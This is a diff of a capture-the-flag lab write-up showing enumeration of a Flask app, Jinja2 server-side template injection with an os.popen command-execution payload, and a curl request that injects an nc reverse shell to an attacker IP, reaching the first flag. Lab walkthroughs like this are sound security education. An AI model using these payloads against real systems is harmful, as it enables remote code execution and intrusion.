@@ -39,85 +39,77 @@ nmap -p- -sV 192.168.29.114
 
 
 Findings:
-Port 5000 – Web Application (Flask)
-Port 22 – SSH (Authentication required)
-Other ports closed
+> Port 5000 – Web Application (Flask)
+> Port 22 – SSH (Authentication required)
+> Other ports closed
 
 ### 1.2 Initial Enumeration
 Visited the web application at http://192.168.190.135:5000/ and observed:
 
-Input fields vulnerable to Reflected XSS
-
-
+Find Nothing in source code
 <img width="975" height="300" alt="image" src="https://github.com/user-attachments/assets/e6f84339-b169-4867-970a-59b1761c04b4" />
 
+## 2.1 Server-Side Template Injection (SSTI)
+
 Now check the subdomains 
-
+````
 gobuster dir -u http://192.168.29.114:5000 -w /usr/share/wordlists/dirb/common.txt
-
+````
 
 <img width="975" height="457" alt="image" src="https://github.com/user-attachments/assets/955fbc86-75a3-4284-a68b-400f9bbb8818" />
 
+find /page subdomain
+
 <img width="975" height="217" alt="image" src="https://github.com/user-attachments/assets/807be188-586d-4ce7-9963-93699ee98258" />
-
-
-
 <img width="975" height="383" alt="image" src="https://github.com/user-attachments/assets/455880c4-cdd0-47c9-a91d-387a18cdb500" />
-
-
 <img width="875" height="380" alt="image" src="https://github.com/user-attachments/assets/23a6b833-0664-4545-b989-e85ce5e433fe" />
 
-URL parameters potentially injectable for Server-Side Template Injection (SSTI)
+Then I search about the version & service running in this # Werkzeug httpd 3.1.3 (Python 3.11.2)
 
-
-
-Then I search about the version & service running in this Werkzeug httpd 3.1.3 (Python 3.11.2)
-
-CVE-2024-34069  https://nvd.nist.gov/vuln/detail/cve-2024-34069
-
- & CVE-2024-49767 related to this vulnerability 
+CVE-2024-34069 (https://nvd.nist.gov/vuln/detail/cve-2024-34069) & CVE-2024-49767 related to this vulnerability 
 
 https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
 
-
-
+then try famous jinja2 template palyload 
+````
+ {{7*7}}
+````
 <img width="848" height="463" alt="image" src="https://github.com/user-attachments/assets/018a8faf-a0a2-41f9-97d1-71cbaedc1921" />
 
-
+output #### 49 Indicates Jinja2 template rendering
 
 <img width="897" height="333" alt="image" src="https://github.com/user-attachments/assets/d2cf3e95-a496-4638-9e3a-6be1f4a78a8d" />
 
+payload to execute commands
+````
+{{ cycler.__init__.__globals__['os'].popen('id').read() }}
+````
 
-Here, /page endpoint is vulnerable to SSTI (Server-Side Template Injection)
-
+````
 curl -sG --data-urlencode "name={{ cycler.__init__.__globals__['os'].popen('ls /home').read() }}" http://192.168.29.114:5000/page
-
-
-
+````
  <img width="975" height="84" alt="image" src="https://github.com/user-attachments/assets/6d7a751c-3b29-4e66-be5f-e78095a06cff" />
 
-
+## 2.2 Reverse Shell
+Generated a reverse shell to gain remote access:
+````
 curl -sG --data-urlencode "name={{ cycler.__init__.__globals__['os'].popen('nc -e /bin/bash 192.168.29.173 4444').read() }}" "http://192.168.29.114:5000/page"
- 
+```` 
 <img width="975" height="57" alt="image" src="https://github.com/user-attachments/assets/68502492-cc7e-4244-b35e-1d58ee9714ae" />
 
+````
 nc -nlvp 4444
-
-
-
-
-
+````
 <img width="975" height="335" alt="image" src="https://github.com/user-attachments/assets/a4e30227-4592-405a-9da4-ebf9042efb4e" />
 
+> Connected successfully to attacker machine
+> Gained low-privilege shell on the server
 
 
-
-
-Flag 1:
-
+# Flag 1: (found in www-data directory)
 <img width="975" height="369" alt="image" src="https://github.com/user-attachments/assets/9a185df7-261d-4d78-b927-3029ffa8c7b8" />
 
-
+## moving forward for second flag
 
 
 <img width="975" height="157" alt="image" src="https://github.com/user-attachments/assets/293fd2b0-3627-40d3-be68-c61164fafed8" />
